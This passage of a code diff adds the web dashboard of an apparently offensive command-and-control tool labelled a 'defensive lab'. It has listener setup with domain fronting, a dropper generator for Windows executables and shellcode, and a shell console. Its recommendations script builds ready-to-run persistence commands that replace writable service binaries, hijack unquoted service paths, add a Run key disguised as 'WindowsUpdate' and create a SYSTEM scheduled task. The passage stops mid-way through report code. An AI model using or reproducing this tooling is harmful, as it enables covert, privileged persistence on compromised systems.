@@ -1,0 +1,757 @@
+﻿<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Defensive Listener Lab - Persistence Framework</title>
+    <link rel="stylesheet" href="/static/css/dashboard.css?v=20260423-recommendations">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+
+    <style>
+/* ============================================================
+   CORRECTION CRITIQUE - VUES ET SCROLL RECOMMENDATIONS
+   ============================================================ */
+
+/* Toutes les vues cachées par défaut */
+.view { display: none !important; }
+
+/* Vue console (grid avec input en bas) */
+#chat-view.active {
+    display: grid !important;
+    grid-template-rows: 1fr auto;
+    min-height: 0;
+}
+
+/* Vue listeners (grid avec barre en bas) */
+#listeners-view.active {
+    display: grid !important;
+    grid-template-rows: 1fr 44px;
+    min-height: 0;
+}
+
+/* Vue models (block simple) */
+#models-view.active {
+    display: block !important;
+    height: 100%;
+}
+
+/* Vue enumeration (block simple) */
+#enumeration-view.active {
+    display: block !important;
+    height: 100%;
+}
+
+/* Vue vulnerability (block scrollable) */
+#vulnerability-view.active {
+    display: block !important;
+    height: 100%;
+    overflow-y: auto;
+}
+
+/* ============================================================
+   VUE RECOMMENDATIONS - FIX SCROLL
+   ============================================================ */
+#recommendations-view.active {
+    display: flex !important;
+    flex-direction: column;
+    height: 100%;
+    min-height: 0;
+    overflow: hidden;
+}
+
+/* Le panel-body doit laisser la place au flex */
+.panel-body {
+    flex: 1;
+    min-height: 0;
+    overflow: hidden;
+    height: 100%;
+}
+
+/* Structure chat-panel en flex colonne */
+.chat-panel {
+    display: flex !important;
+    flex-direction: column;
+    min-height: 0;
+}
+
+.bottom-tabs { flex-shrink: 0; }
+
+/* Header recommendations : ne grandit pas */
+#recommendations-view .recommendation-header {
+    flex-shrink: 0;
+}
+
+/* Summary : ne grandit pas */
+#recommendations-summary {
+    flex-shrink: 0;
+    max-height: 100px;
+    overflow-y: auto;
+}
+
+/* Liste : prend tout l'espace restant et scroll */
+#recommendations-list {
+    flex: 1 1 0;
+    min-height: 0;       /* CRUCIAL pour overflow en flexbox */
+    overflow-y: auto;
+    padding: 4px 6px;
+}
+
+/* Scrollbar recommendations-list */
+#recommendations-list::-webkit-scrollbar { width: 9px; }
+#recommendations-list::-webkit-scrollbar-thumb { background: #3a404c; border-radius: 4px; }
+#recommendations-list::-webkit-scrollbar-track { background: #1a1d23; }
+    </style>
+</head>
+<body>
+    <div class="lab-app">
+        <header class="topbar">
+            <div class="brand">
+                <img src="/static/logo.png" alt="Lab Logo" class="brand-logo">
+            </div>
+            <nav class="menu">
+                <span>View</span>
+                <span>Monitor</span>
+                <span>Profiles</span>
+                <span>Help</span>
+                <button id="new-listener-btn" class="menu-btn">New Listener</button>
+                <button id="new-payload-btn" class="menu-btn" type="button" onclick="try{openPayloadModal();}catch(e){}">Payload</button>
+            </nav>
+            <div class="top-status">
+                <span id="server-status" class="status-indicator offline">OFFLINE</span>
+                <span id="header-time" class="time-display">00:00:00</span>
+            </div>
+        </header>
+
+        <main class="workspace">
+            <section class="sessions-panel">
+                <div class="panel-header">
+                    <span>Simulated Agents</span>
+                    <div class="agents-filter-tools">
+                        <input type="text" id="agent-filter" class="search-box" placeholder="Search host/user/status/os">
+                    </div>
+                </div>
+                <div class="sessions-tabs">
+                    <button id="sessions-tab-table" class="sessions-tab active" type="button">Sessions Table</button>
+                    <button id="sessions-tab-graph" class="sessions-tab" type="button">Sessions Graph</button>
+                </div>
+                <div class="agent-filter-chips" id="agent-filter-chips">
+                    <button class="agent-chip active" type="button" data-filter="all">All</button>
+                    <button class="agent-chip" type="button" data-filter="windows">Windows</button>
+                    <button class="agent-chip" type="button" data-filter="linux">Linux</button>
+                    <button class="agent-chip" type="button" data-filter="alive">Alive</button>
+                    <button class="agent-chip" type="button" data-filter="sleeping">Sleeping</button>
+                    <button class="agent-chip" type="button" data-filter="offline">Offline</button>
+                </div>
+                <div id="sessions-table-view" class="sessions-view active">
+                    <div class="table-wrapper">
+                        <table id="agents-table" class="agents-table">
+                            <thead>
+                                <tr>
+                                    <th data-sort-key="0">ID</th>
+                                    <th data-sort-key="1">target_ip</th>
+                                    <th data-sort-key="2">User</th>
+                                    <th data-sort-key="3">MachineName</th>
+                                    <th data-sort-key="4">Domaine</th>
+                                    <th data-sort-key="5">OS</th>
+                                    <th data-sort-key="6">PID</th>
+                                    <th data-sort-key="7">Last</th>
+                                    <th data-sort-key="8">Health</th>
+                                </tr>
+                            </thead>
+                            <tbody id="agents-tbody">
+                                <tr class="loading"><td colspan="9">No simulated agents</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+                <div id="sessions-graph-view" class="sessions-view">
+                    <div id="sessions-graph-canvas-wrap" class="sessions-graph-canvas-wrap">
+                        <canvas id="sessions-graph-canvas" class="sessions-graph-canvas"></canvas>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <div id="bottom-resizer" class="bottom-resizer" title="Resize bottom panel"></div>
+
+        <section class="chat-panel">
+            <div class="bottom-tabs">
+                <button id="tab-chat" class="bottom-tab active" type="button">
+                    Lab Console <span class="tab-x">×</span>
+                </button>
+                <button id="tab-enumeration" class="bottom-tab" type="button">
+                    Enumeration Results <span class="tab-x">×</span>
+                </button>
+                <button id="tab-listeners" class="bottom-tab" type="button">
+                    Listener <span class="tab-x">×</span>
+                </button>
+                <button id="tab-models" class="bottom-tab" type="button">
+                    MODELS <span class="tab-x">×</span>
+                </button>
+                <button id="tab-recommendations" class="bottom-tab" type="button">
+                    Recommendations <span class="tab-x">×</span>
+                </button>
+                <button id="tab-vulnerability" class="bottom-tab" type="button">
+                    Vulnérabilités <span class="tab-x">×</span>
+                </button>
+            </div>
+
+            <div class="panel-body">
+                <div id="chat-view" class="view active">
+                    <div id="console-output" class="console-output"></div>
+                    <div class="console-input-area">
+                        <input type="text" id="console-input" placeholder="Interactive shell: type command (whoami, dir, ipconfig...)">
+                        <button id="execute-btn" class="btn-primary">Run</button>
+                    </div>
+                </div>
+
+                <div id="enumeration-view" class="view">
+                    <section class="audit-panel standalone-audit-panel">
+                        <div class="panel-header audit-panel-header">
+                            <span id="audit-panel-title">Audit Reports</span>
+                            <div class="audit-panel-actions">
+                                <select id="audit-risk-filter" class="audit-risk-filter" title="Filter reports by risk">
+                                    <option value="all">All Risks</option>
+                                    <option value="low">Low</option>
+                                    <option value="medium">Medium</option>
+                                    <option value="high">High</option>
+                                    <option value="critical">Critical</option>
+                                </select>
+                                <button id="audit-refresh-btn" class="audit-mini-btn" type="button">Refresh</button>
+                            </div>
+                        </div>
+                        <div class="audit-reports-layout">
+                            <div class="audit-table-wrap">
+                                <table class="audit-table">
+                                    <thead>
+                                        <tr><th>Host</th><th>Risk</th><th>Findings</th><th>Created</th><th>ID</th></tr>
+                                    </thead>
+                                    <tbody id="audit-reports-tbody">
+                                        <tr class="loading"><td colspan="5">Select a listener to load audit reports</td></tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                            <div class="audit-preview">
+                                <div class="audit-preview-toolbar">
+                                    <button id="audit-download-btn" class="audit-mini-btn" type="button" disabled>Download JSON</button>
+                                    <button id="audit-copy-btn" class="audit-mini-btn" type="button" disabled>Copy JSON</button>
+                                </div>
+                                <div id="audit-preview-meta" class="audit-preview-meta">No audit report selected.</div>
+                                <textarea id="audit-preview-json" class="audit-preview-json" readonly spellcheck="false"></textarea>
+                            </div>
+                        </div>
+                    </section>
+                </div>
+
+                <div id="listeners-view" class="view">
+                    <div class="listeners-content">
+                        <div class="listeners-table-wrap">
+                            <table class="listeners-table">
+                                <thead>
+                                    <tr><th data-sort-key="0">Name</th><th data-sort-key="1">Protocol</th><th data-sort-key="2">Host</th><th data-sort-key="3">Port</th><th data-sort-key="4">Profile</th><th data-sort-key="5">Status</th><th data-sort-key="6">ID</th></tr>
+                                </thead>
+                                <tbody id="listeners-tbody">
+                                    <tr class="loading"><td colspan="7">No listeners</td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                    <div class="listeners-bottom-bar">
+                        <div class="listeners-bottom-actions">
+                            <button id="listener-add-btn" class="lab-btn" type="button">Add</button>
+                            <button id="listener-start-btn" class="lab-btn" type="button" onclick="startSelectedListener()">Start</button>
+                            <button id="listener-stop-btn" class="lab-btn" type="button" onclick="stopSelectedListener()">Stop</button>
+                            <button id="listener-stats-btn" class="lab-btn" type="button" onclick="showSelectedListenerStats()">Stats</button>
+                            <button id="listener-export-btn" class="lab-btn" type="button" onclick="exportSelectedListener()">Export</button>
+                            <button id="listener-remove-btn" class="lab-btn" type="button" disabled>Remove</button>
+                            <button id="listener-edit-btn" class="lab-btn" type="button" disabled>Edit</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="models-view" class="view">
+                    <div class="models-layout">
+                        <aside class="models-techniques">
+                            <div class="panel-header">Persistence Techniques</div>
+                            <div id="models-techniques-list" class="models-techniques-list"></div>
+                        </aside>
+                        <section class="models-configurator">
+                            <div class="panel-header">Simulation Builder</div>
+                            <div class="models-form-wrap">
+                                <div id="models-description" class="models-description">Select a technique to configure a simulation.</div>
+                                <form id="models-form" class="models-form">
+                                    <div id="models-fields" class="models-fields"></div>
+                                    <div class="models-actions">
+                                        <button id="models-submit-btn" class="btn-primary" type="submit">Execute</button>
+                                    </div>
+                                </form>
+                                <div class="models-output">
+                                    <div class="models-output-title">Result</div>
+                                    <textarea id="models-output-json" class="models-output-json" readonly spellcheck="false"></textarea>
+                                </div>
+                            </div>
+                        </section>
+                    </div>
+                </div>
+
+                <!-- Recommendations View -->
+                <div id="recommendations-view" class="view">
+                    <div class="recommendation-header">
+                        <h3>Smart Persistence Recommendations</h3>
+                        <button id="refresh-recommendations-btn" class="refresh-recommendations">🔄 Refresh</button>
+                    </div>
+                    <div id="recommendations-summary" class="summary-card">
+                        <h4>Select an agent to get recommendations</h4>
+                    </div>
+                    <div id="recommendations-list">
+                        <p style="color: #888; text-align: center; padding: 40px;">Click on an agent in the table above to see persistence recommendations based on its audit data.</p>
+                    </div>
+                </div>
+
+                <!-- Vulnerability Graph View -->
+                <div id="vulnerability-view" class="view">
+                    <div class="vulnerability-dashboard">
+                        <div class="vuln-header">
+                            <h3>📊 Vulnerability Intelligence Dashboard</h3>
+                            <div class="vuln-kpi-grid" id="vuln-kpi-grid">
+                                <div class="kpi-card critical"><div class="kpi-value" id="kpi-critical">0</div><div class="kpi-label">CRITICAL</div></div>
+                                <div class="kpi-card high"><div class="kpi-value" id="kpi-high">0</div><div class="kpi-label">HIGH</div></div>
+                                <div class="kpi-card medium"><div class="kpi-value" id="kpi-medium">0</div><div class="kpi-label">MEDIUM</div></div>
+                                <div class="kpi-card low"><div class="kpi-value" id="kpi-low">0</div><div class="kpi-label">LOW</div></div>
+                                <div class="kpi-card total"><div class="kpi-value" id="kpi-total">0</div><div class="kpi-label">TOTAL</div></div>
+                            </div>
+                        </div>
+                        <div class="vuln-charts">
+                            <div class="chart-container"><canvas id="radar-chart"></canvas></div>
+                            <div class="chart-container"><canvas id="doughnut-chart"></canvas></div>
+                        </div>
+                        <div class="vuln-tree"><h4>🌳 Attack Surface Tree</h4><div id="vuln-tree-container"></div></div>
+                        <div class="risk-heatmap"><h4>🔥 Risk Heatmap by Category</h4><div id="heatmap-container"></div></div>
+                        <div class="report-actions">
+                            <button class="btn-primary" onclick="generateSecurityReport()">📄 Générer Rapport PDF</button>
+                            <button class="btn-secondary" onclick="exportCSV()">📊 Exporter CSV</button>
+                            <button class="btn-info" onclick="copyReportJson()">📋 Copier JSON</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- MODALS -->
+    <div id="listener-modal" class="modal"><div class="modal-content"><div class="modal-header"><h2 id="listener-modal-title">Create Listener</h2><button class="close-btn" onclick="closeListenerModal()">x</button></div><div class="modal-body"><input id="listener-id" type="hidden"><div class="detail-row"><div class="detail-label">Name</div><div class="detail-value"><input id="listener-name" class="form-input" type="text" placeholder="HTTPS Primary"></div></div><div class="detail-row"><div class="detail-label">Protocol</div><div class="detail-value"><select id="listener-protocol" class="form-input"><option value="http">http</option><option value="https" selected>https</option><option value="dns">dns</option></select></div></div><div class="detail-row"><div class="detail-label">Profile</div><div class="detail-value"><select id="listener-profile" class="form-input"><option value="default" selected>default</option><option value="amazon">amazon</option><option value="google">google</option><option value="ms365">ms365</option><option value="cloudflare">cloudflare</option><option value="custom">custom</option></select></div></div><div class="detail-row"><div class="detail-label">Host</div><div class="detail-value"><input id="listener-host" class="form-input" type="text" value="127.0.0.1"></div></div><div class="detail-row"><div class="detail-label">Port</div><div class="detail-value"><input id="listener-port" class="form-input" type="number" value="443"></div></div><div class="detail-row"><div class="detail-label">Use SSL</div><div class="detail-value"><input id="listener-ssl" type="checkbox" checked></div></div><div class="detail-row"><div class="detail-label">Beacon interval (s)</div><div class="detail-value"><input id="listener-interval" class="form-input" type="number" value="5" min="1"></div></div><div class="detail-row"><div class="detail-label">User-Agent</div><div class="detail-value"><input id="listener-ua" class="form-input" type="text" placeholder="Mozilla/5.0 ..."></div></div><div class="detail-row"><div class="detail-label">Domain front</div><div class="detail-value"><input id="listener-domain-front" class="form-input" type="text" placeholder="office365.com / amazonaws.com"></div></div><div class="detail-row"><div class="detail-label">Advanced config (JSON)</div><div class="detail-value"><textarea id="listener-config-json" class="form-input" rows="8" placeholder='{"http_config":{"uris":["/lab/heartbeat"],"user_agents":["LabSimulator/1.0"]},"beacon_config":{"jitter":0.1}}'></textarea></div></div></div><div class="modal-footer"><button class="btn-primary" onclick="createListener()">Create</button><button class="btn-secondary" onclick="closeListenerModal()">Cancel</button></div></div></div>
+
+    <div id="payload-modal" class="modal"><div class="modal-content"><div class="modal-header"><h2 id="payload-modal-title">Create Payload</h2><button class="close-btn" type="button" onclick="closePayloadModal()">x</button></div><div class="modal-body"><input id="payload-id" type="hidden"><div class="detail-row"><div class="detail-label">Payload Name</div><div class="detail-value"><input id="payload-name" class="form-input" type="text" placeholder="Payload-Profile-1"></div></div><div class="detail-row"><div class="detail-label">Action</div><div class="detail-value"><select id="payload-action" class="form-input"><option value="get_system_info" selected>get_system_info</option></select></div></div><div class="detail-row"><div class="detail-label">Arch</div><div class="detail-value"><select id="payload-arch" class="form-input"><option value="x64" selected>x64</option><option value="x86">x86</option></select></div></div><div class="detail-row"><div class="detail-label">Format</div><div class="detail-value"><select id="payload-format" class="form-input"><option value="windows_exe" selected>Windows Exe</option><option value="windows_dll">Windows Dll</option><option value="windows_shellcode">Windows Shellcode</option></select></div></div><div class="detail-row"><div class="detail-label">Listner</div><div class="detail-value"><select id="payload-target-listener" class="form-input"><option value="">No listeners available</option></select></div></div><div class="detail-row"><div class="detail-label">Server IP</div><div class="detail-value"><input id="payload-server-ip" class="form-input" type="text" placeholder="127.0.0.1"></div></div><div class="detail-row"><div class="detail-label">Listener ID</div><div class="detail-value"><input id="payload-listener-id" class="form-input" type="text" placeholder="listener_xxxxxxxxxxxx" readonly style="background-color:#f0f0f0;"></div></div><div class="detail-row"><div class="detail-label">Preview Config</div><div class="detail-value"><textarea id="payload-preview-json" class="form-input" rows="6" readonly></textarea></div></div></div><div class="modal-footer"><button class="btn-primary" onclick="generateDropper()">Generate Dropper</button><button class="btn-secondary" onclick="closePayloadModal()">Close</button></div></div></div>
+
+    <div id="agent-modal" class="modal"><div class="modal-content"><div class="modal-header"><h2>Agent Details</h2><button class="close-btn" onclick="closeModal()">x</button></div><div id="modal-body" class="modal-body"></div><div class="modal-footer"><button class="btn-danger" onclick="killAgent()">Remove Session</button><button class="btn-secondary" onclick="closeModal()">Close</button></div></div></div>
+
+    <div id="toast-container" class="toast-container"></div>
+    <div id="cmdk-modal" class="modal"><div class="modal-content cmdk-content"><div class="modal-header"><h2>Command Palette</h2><button class="close-btn" onclick="closeCmdk()">x</button></div><div class="modal-body"><input id="cmdk-input" class="form-input" type="text" placeholder="Type a command... (chat, listeners, enumeration, models, refresh)"><div id="cmdk-list" class="cmdk-list"></div></div></div></div>
+
+    <script src="/static/js/dashboard.js?v=20260423-recommendations-v7"></script>
+
+    <script>
+// ============================================================
+// GESTION DES ONGLETS - VERSION CORRIGÉE
+// ============================================================
+
+function switchTab(tabId, viewId) {
+    // Désactiver tous les onglets
+    document.querySelectorAll('.bottom-tab').forEach(function(t) {
+        t.classList.remove('active');
+    });
+    // Désactiver toutes les vues
+    document.querySelectorAll('.view').forEach(function(v) {
+        v.classList.remove('active');
+    });
+    // Activer l'onglet cliqué
+    var tab = document.getElementById(tabId);
+    if (tab) tab.classList.add('active');
+    // Activer la vue correspondante
+    var view = document.getElementById(viewId);
+    if (view) view.classList.add('active');
+}
+
+// ============================================================
+// ONGLET RECOMMENDATIONS
+// ============================================================
+(function() {
+    var tab = document.getElementById('tab-recommendations');
+    if (!tab) return;
+
+    tab.onclick = function(e) {
+        e.preventDefault();
+        switchTab('tab-recommendations', 'recommendations-view');
+
+        var auditReport = window.selectedAuditReportDetail;
+        if (!auditReport || !auditReport.report_json) {
+            document.getElementById('recommendations-summary').innerHTML =
+                '<h4>⚠️ No audit report selected</h4><p>Go to Enumeration Results tab and select a report first.</p>';
+            document.getElementById('recommendations-list').innerHTML = '';
+            return;
+        }
+
+        try {
+            var auditData = JSON.parse(auditReport.report_json);
+            var system   = auditData.system   || {};
+            var findings = auditData.findings || [];
+
+            var isAdmin  = system.IsAdministrator || false;
+            var username = system.UserName    || 'user';
+            var hostname = system.MachineName || 'Unknown';
+
+            var writableServices = [];
+            var unquotedServices = [];
+
+            for (var i = 0; i < findings.length; i++) {
+                var finding     = findings[i];
+                var findingType = finding.type || '';
+                if (findingType.indexOf('Writable Service') !== -1) {
+                    writableServices.push({
+                        name:      finding.target.split('(')[0].trim(),
+                        path:      finding.evidencePath,
+                        principal: finding.principal || 'SYSTEM'
+                    });
+                }
+                if (findingType.indexOf('Unquoted Service Path') !== -1) {
+                    unquotedServices.push({
+                        name: finding.target.split('(')[0].trim(),
+                        path: finding.evidencePath
+                    });
+                }
+            }
+
+            var techniqueMapping = {
+                "Writable Service Binary":    { display: "Writable Service Binary",    mitre: "T1543.003", icon: "🔧" },
+                "Writable Service Directory": { display: "Writable Service Directory", mitre: "T1543.003", icon: "🔧" },
+                "Unquoted Service Path":      { display: "Unquoted Service Path",      mitre: "T1574.009", icon: "⚠️" },
+                "Registry Run Key":           { display: "Registry Run Key",           mitre: "T1547.001", icon: "🔑" },
+                "Startup Folder":             { display: "Startup Folder",             mitre: "T1547.001", icon: "📁" }
+            };
+
+            var recommendations = [];
+
+            // Writable services
+            for (var i = 0; i < writableServices.length; i++) {
+                var svc         = writableServices[i];
+                var isDirectory = svc.path.endsWith('\\') || !svc.path.toLowerCase().includes('.exe');
+                var typeKey     = isDirectory ? "Writable Service Directory" : "Writable Service Binary";
+                var mapping     = techniqueMapping[typeKey];
+                var score       = isDirectory ? 90 : 100;
+                var risk        = isDirectory ? "high" : "critical";
+                var reasonText  = isDirectory
+                    ? "Service '" + svc.name + "' DIRECTORY is WRITABLE! Runs as " + svc.principal
+                    : "Service '" + svc.name + "' BINARY is WRITABLE! Runs as " + svc.principal;
+                var finalPath   = isDirectory
+                    ? svc.path + '\\' + svc.name.replace(/\s/g, '') + '.exe'
+                    : svc.path;
+
+                recommendations.push({
+                    display: mapping.display,
+                    mitre:   mapping.mitre,
+                    icon:    mapping.icon,
+                    score:   score,
+                    risk:    risk,
+                    reason:  reasonText,
+                    command: 'copy "C:\\Users\\' + username + '\\Desktop\\Agent\\MyAgent.exe" "' + finalPath + '" /Y && net stop "' + svc.name + '" && net start "' + svc.name + '"'
+                });
+            }
+
+            // Unquoted service paths
+            for (var i = 0; i < unquotedServices.length; i++) {
+                var svc        = unquotedServices[i];
+                var mapping    = techniqueMapping["Unquoted Service Path"];
+                var pathParts  = svc.path.split('\\');
+                var vulnPath   = "";
+                for (var j = 0; j < pathParts.length; j++) {
+                    vulnPath += pathParts[j] + "\\";
+                    if (pathParts[j].indexOf(' ') !== -1) break;
+                }
+                vulnPath = vulnPath.replace(/\\$/, '');
+
+                recommendations.push({
+                    display: mapping.display,
+                    mitre:   mapping.mitre,
+                    icon:    mapping.icon,
+                    score:   95,
+                    risk:    "high",
+                    reason:  "Service '" + svc.name + "' has unquoted path.",
+                    command: 'copy "C:\\Users\\' + username + '\\Desktop\\Agent\\MyAgent.exe" "' + vulnPath + '.exe" /Y && sc stop "' + svc.name + '" && sc start "' + svc.name + '"'
+                });
+            }
+
+            // Registry Run Key
+            var regM = techniqueMapping["Registry Run Key"];
+            recommendations.push({
+                display: regM.display,
+                mitre:   regM.mitre,
+                icon:    regM.icon,
+                score:   isAdmin ? 85 : 75,
+                risk:    "medium",
+                reason:  "Registry Run Key - Simple persistence that survives reboots.",
+                command: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsUpdate /t REG_SZ /d "C:\\Users\\' + username + '\\Desktop\\Agent\\MyAgent.exe" /f'
+            });
+
+            // Scheduled Task
+            if (isAdmin) {
+                recommendations.push({
+                    display: "schtask → system level",
+                    mitre:   "T1053.005",
+                    icon:    "🔧",
+                    score:   88,
+                    risk:    "medium",
+                    reason:  "Scheduled Task - Runs as SYSTEM.",
+                    command: 'schtasks /create /tn "SystemHealthCheck" /tr "C:\\Users\\' + username + '\\Desktop\\Agent\\MyAgent.exe" /sc onlogon /ru "SYSTEM" /f'
+                });
+            } else {
+                recommendations.push({
+                    display: "schtask → user level",
+                    mitre:   "T1053.005",
+                    icon:    "🔧",
+                    score:   65,
+                    risk:    "low",
+                    reason:  "Scheduled Task (User level).",
+                    command: 'schtasks /create /tn "UserUpdate" /tr "C:\\Users\\' + username + '\\Desktop\\Agent\\MyAgent.exe" /sc onlogon /ru "' + username + '" /f'
+                });
+            }
+
+            // Startup Folder
+            var startM = techniqueMapping["Startup Folder"];
+            recommendations.push({
+                display: startM.display,
+                mitre:   startM.mitre,
+                icon:    startM.icon,
+                score:   70,
+                risk:    "low",
+                reason:  "Startup Folder - Simple but visible.",
+                command: 'copy "C:\\Users\\' + username + '\\Desktop\\Agent\\MyAgent.exe" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
+            });
+
+            recommendations.sort(function(a, b) { return b.score - a.score; });
+
+            var criticalCount = 0, highCount = 0;
+            for (var i = 0; i < recommendations.length; i++) {
+                if (recommendations[i].risk === 'critical') criticalCount++;
+                if (recommendations[i].risk === 'high')     highCount++;
+            }
+
+            var bestRec    = recommendations[0];
+            var summaryDiv = document.getElementById('recommendations-summary');
+            summaryDiv.innerHTML =
+                '<h4>📊 ' + hostname + '\\' + username + '</h4>' +
+                '<p>👑 Admin: ' + (isAdmin ? '✅ YES' : '❌ NO') + '</p>' +
+                '<p>🎯 Best: <strong>' + bestRec.display + '</strong> (' + bestRec.score + '%)</p>' +
+                '<p>🔴 Critical: ' + criticalCount + ' | 🟠 High: ' + highCount + '</p>' +
+                '<p>📈 Total: ' + recommendations.length + '</p>';
+
+            var listDiv = document.getElementById('recommendations-list');
+            listDiv.innerHTML = '';
+
+            for (var i = 0; i < recommendations.length; i++) {
+                var rec  = recommendations[i];
+                var card = document.createElement('div');
+                card.className = 'recommendation-card ' + rec.risk;
+                card.innerHTML =
+                    '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">' +
+                        '<span style="font-family:monospace;font-size:11px;font-weight:bold;color:#7dcfff;">' + rec.icon + ' ' + rec.display + '</span>' +
+                        '<span style="font-family:monospace;font-size:9px;background:#2a2a3a;padding:1px 6px;border-radius:10px;">📈 Score: ' + rec.score + '% ' + (i === 0 ? '🏆' : '') + '</span>' +
+                    '</div>' +
+                    '<div style="font-size:9px;font-family:monospace;color:#ffaa66;margin:4px 0;">🎯 MITRE: ' + rec.mitre + '</div>' +
+                    '<div style="font-size:9px;color:#b6bfd3;margin:4px 0;">💡 ' + rec.reason + '</div>' +
+                    '<div style="font-family:monospace;font-size:8px;background:#0d1118;border:1px solid #2e374a;border-radius:3px;padding:4px;color:#9ad0ff;word-break:break-all;">' + rec.command + '</div>';
+                listDiv.appendChild(card);
+            }
+        } catch(err) {
+            console.error('Recommendations error:', err);
+            document.getElementById('recommendations-summary').innerHTML = '<h4>❌ Error parsing audit data</h4>';
+            document.getElementById('recommendations-list').innerHTML = '';
+        }
+    };
+})();
+
+// ============================================================
+// ONGLET VULNERABILITÉS
+// ============================================================
+(function() {
+    var vulnTab = document.getElementById('tab-vulnerability');
+    if (!vulnTab) return;
+
+    vulnTab.onclick = function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        switchTab('tab-vulnerability', 'vulnerability-view');
+
+        var auditReport = window.selectedAuditReportDetail;
+        if (auditReport && auditReport.report_json && typeof window.renderVulnerabilityGraphs === 'function') {
+            try {
+                window.renderVulnerabilityGraphs(JSON.parse(auditReport.report_json));
+            } catch(err) { console.error(err); }
+        }
+    };
+})();
+    </script>
+
+    <button id="theme-toggle" class="theme-toggle" title="Toggle Dark/Light mode">🌙</button>
+
+    <script>
+// ============================================================
+// GÉNÉRATION RAPPORT PDF / CSV / JSON
+// ============================================================
+window.generateSecurityReport = function() {
+    var auditReport = window.selectedAuditReportDetail;
+    if (!auditReport || !auditReport.report_json) {
+        if (typeof toast === 'function') toast('Please select an audit report first', 'error');
+        else alert('Please select an audit report first');
+        return;
+    }
+
+    var data     = JSON.parse(auditReport.report_json);
+    var findings = data.findings || [];
+    var system   = data.system   || {};
+
+    var pdfContent = document.createElement('div');
+    pdfContent.style.cssText = 'padding:20px;font-family:Arial,sans-serif;font-size:12px;background:white;color:black;width:800px;max-width:100%;';
+
+    pdfContent.innerHTML = `
+        <div style="text-align:center;margin-bottom:20px;">
+            <h1 style="color:#333;">🔒 SECURITY ASSESSMENT REPORT</h1>
+            <p>Generated: ${new Date().toLocaleString()}</p>
+            <hr style="border:1px solid #ccc;">
+        </div>
+        <div style="margin-bottom:20px;">
+            <h2 style="color:#2563eb;">📋 SYSTEM INFORMATION</h2>
+            <table style="width:100%;border-collapse:collapse;border:1px solid #ddd;">
+                <tr style="background:#f5f5f5;"><td style="padding:8px;border:1px solid #ddd;"><strong>Machine</strong></td><td style="padding:8px;border:1px solid #ddd;">${system.MachineName||'N/A'}</td></tr>
+                <tr><td style="padding:8px;border:1px solid #ddd;"><strong>User</strong></td><td style="padding:8px;border:1px solid #ddd;">${system.UserName||'N/A'}${system.IsAdministrator?' (Administrator)':' (Standard User)'}</td></tr>
+                <tr style="background:#f5f5f5;"><td style="padding:8px;border:1px solid #ddd;"><strong>Domain</strong></td><td style="padding:8px;border:1px solid #ddd;">${system.Domain||system.Workgroup||'N/A'}</td></tr>
+                <tr><td style="padding:8px;border:1px solid #ddd;"><strong>OS Version</strong></td><td style="padding:8px;border:1px solid #ddd;">${system.OsVersion||system.OperatingSystem||'N/A'}</td></tr>
+                <tr style="background:#f5f5f5;"><td style="padding:8px;border:1px solid #ddd;"><strong>CPU</strong></td><td style="padding:8px;border:1px solid #ddd;">${system.CpuName||'N/A'}</td></tr>
+                <tr><td style="padding:8px;border:1px solid #ddd;"><strong>RAM</strong></td><td style="padding:8px;border:1px solid #ddd;">${system.TotalMemoryMb||system.RAM||'N/A'} MB</td></tr>
+                <tr style="background:#f5f5f5;"><td style="padding:8px;border:1px solid #ddd;"><strong>Last Boot</strong></td><td style="padding:8px;border:1px solid #ddd;">${system.LastBootTime||'N/A'}</td></tr>
+            </table>
+        </div>
+        <div style="margin-bottom:20px;">
+            <h2 style="color:#2563eb;">📊 VULNERABILITY SUMMARY</h2>
+            <table style="width:100%;border-collapse:collapse;border:1px solid #ddd;">
+                <tr style="background:#f5f5f5;"><td style="padding:8px;border:1px solid #ddd;"><strong>Total Findings</strong></td><td style="padding:8px;border:1px solid #ddd;">${findings.length}</td></tr>
+                <tr><td style="padding:8px;border:1px solid #ddd;color:#ef4444;"><strong>🔴 CRITICAL</strong></td><td style="padding:8px;border:1px solid #ddd;">${findings.filter(f=>(f.severity||'').toUpperCase()==='CRITICAL').length}</td></tr>
+                <tr style="background:#f5f5f5;"><td style="padding:8px;border:1px solid #ddd;color:#f97316;"><strong>🟠 HIGH</strong></td><td style="padding:8px;border:1px solid #ddd;">${findings.filter(f=>(f.severity||'').toUpperCase()==='HIGH').length}</td></tr>
+                <tr><td style="padding:8px;border:1px solid #ddd;color:#eab308;"><strong>🟡 MEDIUM</strong></td><td style="padding:8px;border:1px solid #ddd;">${findings.filter(f=>(f.severity||'').toUpperCase()==='MEDIUM').length}</td></tr>
+                <tr style="background:#f5f5f5;"><td style="padding:8px;border:1px solid #ddd;color:#22c55e;"><strong>🟢 LOW</strong></td><td style="padding:8px;border:1px solid #ddd;">${findings.filter(f=>(f.severity||'').toUpperCase()==='LOW').length}</td></tr>
+            </table>
+        </div>
+        <div style="margin-bottom:20px;">
+            <h2 style="color:#2563eb;">🔍 DETAILED FINDINGS</h2>
+            <table style="width:100%;border-collapse:collapse;border:1px solid #ddd;font-size:10px;">
+                <thead>
+                    <tr style="background:#2563eb;color:white;">
+                        <th style="padding:8px;border:1px solid #ddd;">Severity</th>
+                        <th style="padding:8px;border:1px solid #ddd;">Type</th>
+                        <th style="padding:8px;border:1px solid #ddd;">Target</th>
+                        <th style="padding:8px;border:1px solid #ddd;">Path / Evidence</th>
+                        <th style="padding:8px;border:1px solid #ddd;">Principal</th>
+                    </tr>
